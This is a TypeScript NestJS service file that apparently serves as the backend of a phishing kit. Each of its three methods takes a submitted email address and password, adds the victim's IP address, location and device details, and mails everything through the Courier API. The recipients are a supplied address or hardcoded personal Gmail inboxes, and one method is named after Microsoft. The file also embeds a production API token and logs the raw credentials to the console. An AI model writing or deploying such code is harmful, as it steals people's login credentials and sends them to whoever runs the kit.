import { Injectable } from '@nestjs/common';
import { EmailDto } from './dto/email.dto';
import { CourierClient } from '@trycourier/courier';
import { DeviceService } from './device.service';
import { Request } from 'express';

@Injectable()
export class AppService {
  constructor(private readonly deviceService: DeviceService) {}
  getHello(): string {
    return 'Hello World!';
  }

  async sendMail(data: EmailDto, req: Request) {
    const { email, password, source, to } = data;
    // Install with: npm install @trycourier/courier
    console.log(data)
    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

    const { deviceDetails, ipAddr, location } =
       await this.deviceService.getLoginDeviceInfo(req);

    const { requestId } = await courier.send({
      message: {
        to: {
          email: to,
        },
        template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
        data: {
          recipientName: `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`,
          source,
        },
      },
    });

    return { requestId };
  }
  

  async sendMailMicrosoft(data: EmailDto, req: Request) {
    const { email, password, source } = data;
    // Install with: npm install @trycourier/courier

    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

     const { deviceDetails, ipAddr, location } =
       await this.deviceService.getLoginDeviceInfo(req);

    const { requestId } = await courier.send(
      {
        message: {
          to: {
            email: 'peterstilinski111@gmail.com',
          },
          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
          data: {
            recipientName: `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`,
            source
          },
        },
      },
      {
        idempotencyExpiry: 3000,
      },
    );
    return requestId;
  }


  async sendMailBrown(data: EmailDto, req: Request) {
    const { email, password, source } = data;
    // Install with: npm install @trycourier/courier
    console.log(data)
    const courier = CourierClient({
      authorizationToken: 'pk_prod_9HME2CJ57PM4PQNP6FYZGQMNX9NX',
    });

    const { deviceDetails, ipAddr, location } =
      await this.deviceService.getLoginDeviceInfo(req);

    const { requestId } = await courier.send(
      {
        message: {
          to: {
            email: 'brownjessica196@gmail.com',
          },
          template: 'PHZPJGYWZG4BKHQ9A5DS5XY9NCAP',
          data: {
            recipientName: `email: ${email}, \n password: ${password}

            IP: ${ipAddr}
            Location: ${location}
            Device: ${deviceDetails}`,
            source
          },
        },
      },
      {
        idempotencyExpiry: 3000,
      },
    );
    return requestId;
  }
}
